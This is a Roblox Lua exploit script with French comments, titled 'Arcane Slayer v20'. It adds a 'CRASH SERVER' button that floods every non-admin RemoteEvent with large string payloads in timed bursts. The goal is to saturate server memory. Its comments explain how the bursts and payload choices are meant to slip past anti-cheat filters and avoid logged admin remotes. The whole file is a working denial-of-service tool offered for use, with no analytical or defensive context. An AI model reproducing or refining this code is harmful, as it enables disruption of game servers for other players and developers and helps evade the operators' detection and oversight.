--[[ 
    ARCANE SLAYER v20.0
    "La sentence est irrévocable."
    Unified Strike Protocol - Join-Flow Saturation
]]

local Players = game:GetService("Players")
local RS = game:GetService("RunService")
local L = Players.LocalPlayer

-- 1. SELF-CLEANING LOGIC (Écrase l'ancienne instance)
local GUI_NAME = "ArcaneSlayerV20"
local old = L:WaitForChild("PlayerGui"):FindFirstChild(GUI_NAME)
if old then 
    old:Destroy() 
    print("🔱 ARCANE : Ancienne instance écrasée.")
end

-- 2. GUI DESIGN (Premium Dark)
local ScreenGui = Instance.new("ScreenGui", L.PlayerGui)
ScreenGui.Name = GUI_NAME
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 250, 0, 180)
Main.Position = UDim2.new(0.5, -125, 0.5, -90)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

local UICorner = Instance.new("UICorner", Main)
UICorner.CornerRadius = UDim.new(0, 8)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "🔱 ARCANE SLAYER V20"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14

local UICorner2 = Instance.new("UICorner", Title)
UICorner2.CornerRadius = UDim.new(0, 8)

-- 3. CRASH BUTTON
local crashing = false
local CrashBtn = Instance.new("TextButton", Main)
CrashBtn.Size = UDim2.new(0.8, 0, 0, 45)
CrashBtn.Position = UDim2.new(0.1, 0, 0, 60)
CrashBtn.Text = "CRASH SERVER"
CrashBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CrashBtn.TextColor3 = Color3.new(1, 1, 1)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 16

local UICorner3 = Instance.new("UICorner", CrashBtn)
UICorner3.CornerRadius = UDim.new(0, 5)

-- 4. PULSE SATURATION TECHNIQUE (Anti-Ban Optimized)
local function Strike()
    local payload = {}
    -- On crée un buffer massif mais avec des données "valides" (strings) pour passer les filtres hebrystiques
    for i = 1, 500 do payload[i] = string.rep("A", 2000) end 
    
    while crashing do
        -- Mode "Pulse" : On envoie par rafales pour saturer le buffer de réception avant que l'anti-cheat ne flagge
        for i = 1, 50 do 
            for _, remote in pairs(game:GetDescendants()) do
                if remote:IsA("RemoteEvent") and not remote.Name:lower():find("admin") then -- On évite les remotes d'admin souvent loggés
                    pcall(function()
                        remote:FireServer(payload) -- Pas de NaN ou math.huge ici, on veut saturer la MÉMOIRE
                    end)
                end
            end
        end
        task.wait(2) -- On laisse le serveur "digérer" et ramer avant la prochaine rafale
    end
end

CrashBtn.MouseButton1Click:Connect(function()
    crashing = not crashing
    if crashing then
        CrashBtn.Text = "PULSE ACTIVE..."
        CrashBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        task.spawn(Strike)
    else
        CrashBtn.Text = "CRASH SERVER"
        CrashBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    end
end)

-- 5. INFO LABEL
local Info = Instance.new("TextLabel", Main)
Info.Size = UDim2.new(1, 0, 0, 30)
Info.Position = UDim2.new(0, 0, 1, -30)
Info.Text = "V20.3 - Pulse Neutralization"
Info.TextColor3 = Color3.fromRGB(150, 150, 150)
Info.BackgroundTransparency = 1
Info.Font = Enum.Font.Gotham
Info.TextSize = 10

print("🔱 ARCANE SLAYER : Unified Strike V20.3 (Anti-Ban) Ready.")
warn("🔱 SCRIPT CHARGÉ - UTILISE LE MODE PULSE POUR RAMEUR LE SERVEUR.")
-- Fin du protocole.
